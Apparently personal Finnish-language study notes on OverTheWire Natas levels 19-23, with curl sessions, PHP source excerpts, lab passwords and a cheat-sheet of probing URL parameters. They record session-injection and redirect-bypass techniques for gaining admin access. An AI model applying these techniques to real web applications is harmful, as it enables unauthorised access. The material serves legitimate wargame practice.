└─$ echo -n 3238312d61646d696e | xxd -r -p
281-admin                                                                                                                                             
Eli tästä luvusta kirjautuu esim. satunnaisella tai admin;admin (username:password):lla sisään, sitten avaa F12 --> appliaction, niin muuttaa sen eväste luvunsa ja muutetun jälkeen päivitä sivusto niin saadaan selvitettyä natas20 salasansa.


https://github.com/psmiraglia/ctf/blob/master/overthewire/natas/natas19.md

https://learnhacking.io/overthewire-natas-level-19-walkthrough/

https://samxia99.medium.com/overthewire-updated-natas-walkthrough-level-19-4c0d1236206c


---

# Natas 20 - START HERE;


Username: natas20
Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw




┌──(kali㉿kali)-[~]
└─$ curl -Headers "Referer: http://natas20.natas.labs.overthewire.org/" http://natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw@natas20.natas.labs.overthewire.org 
curl: (3) URL rejected: Malformed input to a URL function
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas20", "pass": "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw" };</script></head>
<body>
<h1>natas20</h1>
<div id="content">
You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
<form action="index.php" method="POST">
Your name: <input name="name" value=""><br>
<input type="submit" value="Change name" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>


Muutamissa funtion koodissa on mainittu *debug* sana, että lisätty URl perään **?debug**, et ainakin näytti jotakin mielenkiintoista dataa/infoa. Toistin saman curl komennon, et verrattuna selaimessa on sama toisto. Tarkistin ton saving in /var polun, joka ei viennyt mihinkään


┌──(kali㉿kali)-[~]
└─$ curl -Headers "Referer: http://natas20.natas.labs.overthewire.org/" http://natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw@natas20.natas.labs.overthewire.org?debug 
curl: (3) URL rejected: Malformed input to a URL function
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas20", "pass": "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw" };</script></head>
<body>
<h1>natas20</h1>
<div id="content">
DEBUG: MYREAD pual2spejim19i8j0rhalfksrt<br>DEBUG: Session file doesn't exist<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
<form action="index.php" method="POST">
Your name: <input name="name" value=""><br>
<input type="submit" value="Change name" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
DEBUG: MYWRITE pual2spejim19i8j0rhalfksrt <br>DEBUG: Saving in /var/lib/php/sessions/mysess_pual2spejim19i8j0rhalfksrt<br>                            


## netistä haettuja vihjeitä

https://github.com/psmiraglia/ctf/blob/master/overthewire/natas/natas20.md

https://learnhacking.io/overthewire-natas-level-20-walkthrough/

https://samxia99.medium.com/overthewire-updated-natas-walkthrough-level-20-ed37d1d1e03d

Nyt ideana on saada päästettyä "login as an admin" - kuitenkin päästä admin tunnuksilla sisään ja saada selvitettyä natas 21 level salasansa.


Tässä osuudessa tunnistetieto tarkastamiseksi tarvittaan **$_SESSION-muuttuja**, joka sisältää aviamen nimeltä admin ja sen arvo on oltava 1 eli tosi.

```
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */
```


## Source code analyysi (lähdekoodi)
Tästä nähdään kuin saattaisiin istunnon arvon yllä olevia debug näkymiä. Näiden annettujen lähdekoodi loppua nähdään seuraavat koodit:
Tämä koskien on toi istunnon tallennus hallinta mikälie

```

session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>

```

Aletaan purkkaa tätä funktiotta vähäsen
1. ensimmäisessä funktiossa (sesion-set_save_handler() on se omien sessiontallennusfunktioiden käyttö koskien: **avaus, sulkeminen, lukea, kirjoittaa, tuhota ja käsittelä roskia**. 
Tämä tosiaan on yleinen esim. kun istunto tallenntaan tietokantaan, tiedostoon tai muuhun kuin tavalliseen PHP $_SESSION - mekanismiin.

2. tarkastuksena onko $_REQUEST["name"] olemassa

- Jos käyttäjä on lähettänyt name-arvon (esim. lomakkeesta), se tallennetaan $_SESSION["name"]-muuttujaan.
- debug()-funktio voi esim. tallentaa tämän arvon lokiin, mutta ei vaikuta toiminnallisuuteen.

3. print_credentials();

- Tämä funktio todennäköisesti tarkistaa sessiossa olevan nimen ja näyttää salasanan vain jos käyttäjä on "admin".
- Eli jos sessioon saadaan tallennettua name = admin, voi flagi paljastua.

VIimeisenä luetaan sessiosta "name" ja asetetaan muuttujaan "$name". Periaatteessa tässä funktiossa koskien on "lukea" ja "kirjoittaa" kun ne käsittelevät istuntojen tallennusta ja lukemista. Jos sessio-ID saadaan johtuen admin sessio (esim. oikeanlainen heksattu tunniste) niin serveri saattaa palauttaa admin oikeudet.


## Haavoittuvuuden paikantaminen

Eli nyt alettaan selvittää ja tarkisteellaan tämä tason haavoittuvuutta ja debugoidaan muuttujansa. Tässä välissä/tilanteessa joutuu kirjoittaa url perään toi **?debug**, koska jotta se ymmärtää ja syöttää toi kentän muuttamisen nimensä.

Ohjeissa on käytettään burp suit jotenkin jännästi (vanhat ohjeet), mutta jos yrittää saada toistetua "test" sitten "admin + 1" ja lisää url perään *"?debug"* niin sen jälkeen pitäisi saada nähdättyä natas21 salasanasa, mutta voi olla mennään mutkan kautta.

Burpsuit siinä kun syöttää kenttään "test admin 1" niin tässä välilyönnissä se muuttuu automaattisesti URL enkoodattuna ja sama pätee muita erikoismerkkiä ja sen kanssa.

Vastauksena ja ratkaistettuna pitisi mennä **\nAadmin 1** , et toi välilyönti tulee mukaan. Ja samahan pitäisi jotenkin aktivoida **BurpSuite** kautta ton **Proxy**:n *Intercept* asetuksensa päälle, jotta ikään kuin seuraa suoraan sitä lomakekenttäänsä. Keinona on jotenkin muuttaa sen lähetyksensä et menee oikeasti, koska joka kerta kun toistaa "test" ja "\naadmin 1" niin se ei ymmärrä sitä pyyntöä.


Username: natas20
Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw



---

# Natas 21 - START HERE;

Username: natas21
Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH

Tässä on pari erisivustoa, josta etusivu on ja toisessa on väri sivusto, että molemmissa menee sama salasansa. Toisessa sivustossa voi muuttaa värinsä natas21 - CSS style experimenter


CSS Tyle experimenter - sallitut ominaisuudet ja ainoastaan sanalla "hello world" - että sen takana on pieni taustaväri. Vain validoitut ominaisuudet ja tietyt voi muuttaa esim. se teksti voi siirtyä keksellä, vasen ja oikealle, että taustaväri ja oletuksena on se on väriltään keltainen kun kirjautuu uudestaan, että fontti koko voi muuttaa prosenttin mukaan. Sekä siellä koodi pätkässä on **debug** joten lisättin url perään **?debug** ja antoi tämän eli just: 

[DEBUG] Session contents:
Array ( )



Pientä pohdiskelua ainakin tämä muistuu aikaisemman tason mukaan (natas20), mutta silti kirjauduttu natas21 etusivuston mukaan ollaan kirjauduttu regular user.


## Kali linux checkkausta

┌──(kali㉿kali)-[~]
└─$ curl -Headers "Referer: http://natas21.natas.labs.overthewire.org/" http://natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH@natas21.natas.labs.overthewire.org 
curl: (3) URL rejected: Malformed input to a URL function
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas21", "pass": "BPhv63cKE1lkQl04cE5CuFTzXe15NfiH" };</script></head>
<body>
<h1>natas21</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
</p>

You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>


Otin toisesta sivusta vähä lisätietoa ja katsotaan mitä tulostui;

┌──(kali㉿kali)-[~]
└─$ curl -Headers "Referer: http://natas21-experimenter.natas.labs.overthewire.org/" http://natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH@natas21-experimenter.natas.labs.overthewire.org 
curl: (3) URL rejected: Malformed input to a URL function
<html>
<head><link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"></head>
<body>
<h1>natas21 - CSS style experimenter</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
</p>

<p>Example:</p>
<div style='background-color: yellow; text-align: center; font-size: 100%;'>Hello world!</div>
<p>Change example values here:</p>
<form action="index.php" method="POST">align: <input name='align' value='center' /><br>fontsize: <input name='fontsize' value='100%' /><br>bgcolor: <input name='bgcolor' value='yellow' /><br><input type="submit" name="submit" value="Update" /></form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>


Tässä lisäsin -v eli verbose , mitä halutaan nähdä tarkemmin mitä tapahtuu;

┌──(kali㉿kali)-[~]
└─$ curl -v -Headers "Referer: http://natas21-experimenter.natas.labs.overthewire.org/" http://natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH@natas21-experimenter.natas.labs.overthewire.org
* URL rejected: Malformed input to a URL function
* Closing connection
curl: (3) URL rejected: Malformed input to a URL function
* Host natas21-experimenter.natas.labs.overthewire.org:80 was resolved.
* IPv6: (none)
* IPv4: 13.50.19.111
*   Trying 13.50.19.111:80...
* Connected to natas21-experimenter.natas.labs.overthewire.org (13.50.19.111) port 80
* Server auth using Basic with user 'natas21'
> GET / HTTP/1.1
> Host: natas21-experimenter.natas.labs.overthewire.org
> Authorization: Basic bmF0YXMyMTpCUGh2NjNjS0UxbGtRbDA0Y0U1Q3VGVHpYZTE1TmZpSA==
> User-Agent: curl/8.7.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Wed, 16 Jul 2025 16:03:48 GMT
< Server: Apache/2.4.58 (Ubuntu)
< Set-Cookie: PHPSESSID=2f3uc769empjoea1dgk92peue5; path=/; HttpOnly
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 830
< Content-Type: text/html; charset=UTF-8
< 
<html>
<head><link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"></head>
<body>
<h1>natas21 - CSS style experimenter</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
</p>

<p>Example:</p>
<div style='background-color: yellow; text-align: center; font-size: 100%;'>Hello world!</div>
<p>Change example values here:</p>
<form action="index.php" method="POST">align: <input name='align' value='center' /><br>fontsize: <input name='fontsize' value='100%' /><br>bgcolor: <input name='bgcolor' value='yellow' /><br><input type="submit" name="submit" value="Update" /></form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
* Connection #0 to host natas21-experimenter.natas.labs.overthewire.org left intact


## Kali linux - Burpsuite

Tämä burp suite harjoitus joka muistuu sama kuin aikaisempi taso eli *natas20* level, mutta tarvittaan se burp suit sivusto ja toistetaan se "send to repeater" välilehteen. Tällä kertaa käytettään se css style sivustoa ja koska siellä on lomakekenttä, vaikka se on tarkoitettu syöttää vain muotoilua värinvaihto, tekstin kenttä onko keskellä-vasen-oikealla ja fonttin kokoon.

Jotenkin osasta ohjeesta, muuttaa tuosta kentästä ja lähettää **&admin=1** - niin saa uuden PHPSESSID tunnuksensa, sitten korvaa sinne natas21 etusivuun ja päivittää sivuston niin natas22 salasana pitäisi tulla.

Periaatteessa pitäisi mennä sivuston natas21-experimenter-sivulle ja tehdä lomakemuokkaus (admin=1). Niin sieltä tulee joku PHPSESSID-arvo ja sitä pitää liittää natas21 pääsivulle ja sitten päivittää uuden sivuston niin pitäisi saada admin oikeus..


Username: natas21
Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH



https://learnhacking.io/overthewire-natas-level-21-walkthrough/

https://n0j.github.io/2017/03/21/otw-natas-21.html

https://systemweakness.com/overthewire-updated-natas-walkthrough-level-21-f39db932593f



# natas 22 - START HERE;

Username: natas22
Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz

Ekana tyhjä sivu ja pelkä "view sourcecode".
Tässä tasossa voi koskien tuota PHP-session istuntoa jälleen kerran ja tarkistaa onko URL parametri `?revelio=..` mikäli paljastuu tai paljastaa sitten suoriuttuu jotenkin admin = 1 , josta saa käyttäjä saa sitten natas22 salasansa.


```
if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>
```

Tässä ei mainittu **debug** sanaa, koska aikaisemmissa oli lisätty url perään `?debug` ja kokeillaan sijoittaa **revelio**. (Testattu: http://natas22.natas.labs.overthewire.org/?revelio=1) josta välähti pikaisesti ja palattin tähän natas22 etusivulle.

Ensimmäisessä kirjauduttu ainakin sen natas22 eävste PHPSESSID: 81tu6j4hevs6uffovnlm3o9vbf

┌──(kali㉿kali)-[~]
└─$ echo -n 81tu6j4hevs6uffovnlm3o9vbf | xxd -r -p
�                                                                                                                                                 


## Kali linxu tarkistusta 

┌──(kali㉿kali)-[~]
└─$ curl -v -Headers "Referer: http://natas22.natas.labs.overthewire.org/" http://natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz@natas22.natas.labs.overthewire.org
* URL rejected: Malformed input to a URL function
* Closing connection
curl: (3) URL rejected: Malformed input to a URL function
* Host natas22.natas.labs.overthewire.org:80 was resolved.
* IPv6: (none)
* IPv4: 13.50.19.111
*   Trying 13.50.19.111:80...
* Connected to natas22.natas.labs.overthewire.org (13.50.19.111) port 80
* Server auth using Basic with user 'natas22'
> GET / HTTP/1.1
> Host: natas22.natas.labs.overthewire.org
> Authorization: Basic bmF0YXMyMjpkOHJ3R0JsMFhzbGczYjc2dWgzZkViU2xuT1VCbG96eg==
> User-Agent: curl/8.7.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Fri, 18 Jul 2025 12:10:36 GMT
< Server: Apache/2.4.58 (Ubuntu)
< Set-Cookie: PHPSESSID=j2rnpfveneqfttdbv2jl7o45f2; path=/; HttpOnly
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 896
< Content-Type: text/html; charset=UTF-8
< 


<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">


<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
* Connection #0 to host natas22.natas.labs.overthewire.org left intact



┌──(kali㉿kali)-[~]
└─$ curl -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz --referer http://natas23.natas.labs.overthewire.org/ http://natas22.natas.labs.overthewire.org


<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">


<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>


Username: natas22
Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz


`-i` näyttää http hederit, `--user` kirjauduttaan sisään millä tunnuksella <username:password> sitten "http-url" ja `/?revelio=1`.

curl -i --user natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz "http://natas22.natas.labs.overthewire.org/?revelio=1"


┌──(kali㉿kali)-[~]
└─$ curl -i --user natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz "http://natas22.natas.labs.overthewire.org/?revelio=1"
HTTP/1.1 302 Found
Date: Fri, 18 Jul 2025 12:32:54 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: PHPSESSID=mnv6949mir0vverielcbtbt54l; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /
Content-Length: 1028
Content-Type: text/html; charset=UTF-8



<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">

You are an admin. The credentials for the next level are:<br><pre>Username: natas23
Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>


Miksi tämä toimii näin?
- vaikka siinä php koodissa on mainittu lähettää `location: /` headeriä, mutta se ei lopeta skriptiä. 
- curl komennossa ei seuraa uudelleen ohjausta automaattisesti, niin se näyttää koko vastauksen ja mukaan lukien salasanansa.

Pieni pohdintana olisiko pitänyt tietää tämä vastaus kuitenkin että sijoittaa ton parametrin perään vaan ja sitten mukaan curl -i natas 22 käyttäjä.



tässä komennossa tapahtuu `-L` seuraa redirectejä ja `--max-redirs 0` tarkoittaa estää redirectin seuraamisen.
curl -i -L --max-redirs 0 --user natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz "http://natas22.natas.labs.overthewire.org/?revelio=1"

┌──(kali㉿kali)-[~]
└─$ curl -i -L --max-redirs 0 --user natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz "http://natas22.natas.labs.overthewire.org/?revelio=1"
HTTP/1.1 302 Found
Date: Fri, 18 Jul 2025 12:51:00 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: PHPSESSID=31d2602ulvfpmhrc177img5on8; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /
Content-Length: 1028
Content-Type: text/html; charset=UTF-8

curl: (47) Maximum (0) redirects followed
                                                                                                                                                  
## curl komentoja CTF ja pentest tilassa
lisä lunttilappun tarkistus listaan

curl -i --user natas22:<salasana> "http://natas22.natas.labs.overthewire.org/?debug=1"

jos sivustolla ois tai koodin pätkässä `debug` parametri sana, niin se saattaa aktivoida lisäinformaation tai virheilmoitusta. `curl -i` näyttää ne suoraan, vaikka selain ei niitä näyttäisikään.


Muutama curl taktinen CTF- ja pentest tilanteissa ja tämä on normi testausta web-sovelluksien kanssa on hyvä myös kokeilla:

- `curl -i` tai `curl -v` nähdäkseen kaiken

sitten parametreja eli url perässä:
- `?debug=1`
- `?admin=1`
- `?reveal=true`
- `?source=1`
- `?test=1`
- `?show=all`

Sekä nämä voivat paljastaa kehittäjien jättämiä takaporttej tai testikoodeja.


## 🧭 Polku PHP-koodissa (Natas-harjoitukset)

Tässä muistiinpano koskee view source -välilehden (index-source.html) PHP-koodia Natas-tasoissa. Niissä koodi sisältää erityisiä URL-parametreja, jotka eivät näy sivulla normaalisti, mutta ne kytkevät salaisen toiminnon päälle. Niitä voi käyttää vain tietyissä tilanteissa, ja niihin liittyy istunto (session) tai eväste.

### 🔐 Esimerkki Natas22: revelio

```
if(array_key_exists("revelio", $_GET)) {
  if(!($_SESSION and $_SESSION["admin"] == 1)) {
    header("Location: /");
  }
}
```

→ Tässä parametri `revelio` toimii salaisuutena, mutta sen käyttö vaatii, että istunnossa on admin-oikeudet (`$_SESSION["admin"] == 1`). Muuten selain ohjataan takaisin alkuun. Eli pelkkä URL-parametri ei riitä — pitää myös huijata sessiota.


### 🧪 Esimerkki Natas20: debug

```
if(array_key_exists("debug", $_GET)) {
  print "DEBUG: $msg<br>";
}
```

→ Parametri `debug` ei paljasta salasanaa suoraan, mutta näyttää lisätietoja, kuten mitä istunnon sisällä tapahtuu, ja miten session-tiedosto rakentuu. Tämä voi auttaa ratkaisemaan tehtävää.


## ❓ Miksi kysymysmerkki (?) pitää olla URL:ssa ennen parametreja?

Koska se aloittaa query stringin eli GET-pyynnön parametrit. Esimerkiksi: `http://natas22.natas.labs.overthewire.org/index.php?revelio`


Ilman kysymysmerkkiä selain ei lähetä parametreja ollenkaan, eikä PHP:n `$_GET`-taulukossa ole mitään.


## 🧠 Yhteenveto

- Parametrit kuten revelio ja debug toimivat salaisina kytkiminä.
- Ne pitää lisätä URL:iin kysymysmerkin jälkeen.
- Oikeanlaisen tuloksen saaminen voi vaatia istunnon muokkausta (admin=1) tai debug-tulosteiden analysointia.
- Molemmat tasot perustuvat samaan ideaan: piilotetut URL-parametrit aktivoivat toiminnon, jota ei normaalisti näe.



# natas 23 - START HERE;

Username: natas23
Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs


Tuossa jo aikaisempikin n. 20 level alkaen tarkistamatta etusivun HTML koodia, ja hypättiin välittömästi asiansa ja jos on view-source koodi sivusto.

Tässä tällä kertaa syötetään kenttään koodi lomakkeeseen niin varmasti antaa natas24 salasansa. Seuraavassa **index-source.html** . Lomakekentään siis syötä koodi koko (pituus) 20 sanaa, ja sitten tekee sen if-else funktionsa jos täsmentyy niin antaa natas24 vastauksensa ja jos ei sitten ei täsmää. Eli jos syöttää salasan formaattiin "iloveyou" tai "passwd" tai joka on alle 10 sanaa - niin se on väärin. Todellinen vastaus voi olla pitää syöttää kenttään yli 10 ja alle 20 sanan väliltä.

```
Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```

Pari / muutamien testauksen jälkeen just "iloveyou", "passwd" , "administrator" ja jne, se toisti siihen URL perään parametriä näin: http://natas23.natas.labs.overthewire.org/?passwd=administrator 

Vastaus ei ole administrator.


## Kali linux komentoa

Username: natas23
Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs



┌──(kali㉿kali)-[~]
└─$ curl -i --user natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs "http://natas23.natas.labs.overthewire.org/"
HTTP/1.1 200 OK
Date: Mon, 21 Jul 2025 11:14:57 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1036
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas23", "pass": "dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs" };</script></head>
<body>
<h1>natas23</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>



┌──(kali㉿kali)-[~]
└─$ curl -i -L --max-redirs 0 --user natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs "http://natas23.natas.labs.overthewire.org/"
HTTP/1.1 200 OK
Date: Mon, 21 Jul 2025 11:15:45 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1036
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas23", "pass": "dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs" };</script></head>
<body>
<h1>natas23</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>




┌──(kali㉿kali)-[~]
└─$ curl -i -v --user natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs "http://natas23.natas.labs.overthewire.org/"
* Host natas23.natas.labs.overthewire.org:80 was resolved.
* IPv6: (none)
* IPv4: 13.50.19.111
*   Trying 13.50.19.111:80...
* Connected to natas23.natas.labs.overthewire.org (13.50.19.111) port 80
* Server auth using Basic with user 'natas23'
> GET / HTTP/1.1
> Host: natas23.natas.labs.overthewire.org
> Authorization: Basic bmF0YXMyMzpkSVVRY0kzdVN1czFKRU9TU1dSQUVYQkc4S2JSOHRScw==
> User-Agent: curl/8.7.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Date: Mon, 21 Jul 2025 11:16:40 GMT
Date: Mon, 21 Jul 2025 11:16:40 GMT
< Server: Apache/2.4.58 (Ubuntu)
Server: Apache/2.4.58 (Ubuntu)
< Vary: Accept-Encoding
Vary: Accept-Encoding
< Content-Length: 1036
Content-Length: 1036
< Content-Type: text/html; charset=UTF-8
Content-Type: text/html; charset=UTF-8
< 

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
